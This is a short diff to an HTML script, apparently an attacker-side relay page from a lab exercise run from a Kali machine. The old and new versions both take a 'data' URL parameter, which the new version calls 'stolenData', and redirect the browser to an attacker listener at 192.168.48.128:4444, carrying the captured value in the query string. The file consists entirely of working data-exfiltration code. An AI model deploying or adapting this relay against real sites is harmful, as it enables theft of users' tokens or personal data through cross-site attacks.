@@ -1,6 +1,12 @@
 <script>
-    const urlParams = new URLSearchParams(window.location.search);
-    const data = urlParams.get('data');
-    // Redirect the browser to your Kali IP, carrying the data
-    window.location.href = "http://192.168.48.128:4444/?captured=" + data;
+    // 1. Get the 'data' parameter from the URL
+    const params = new URLSearchParams(window.location.search);
+    const stolenData = params.get('data');
+
+    if (stolenData) {
+        // 2. Forward it to your Kali VM
+        window.location.href = `http://192.168.48.128:4444/capture?todo=${stolenData}`;
+    } else {
+        document.write("No data received.");
+    }
 </script>
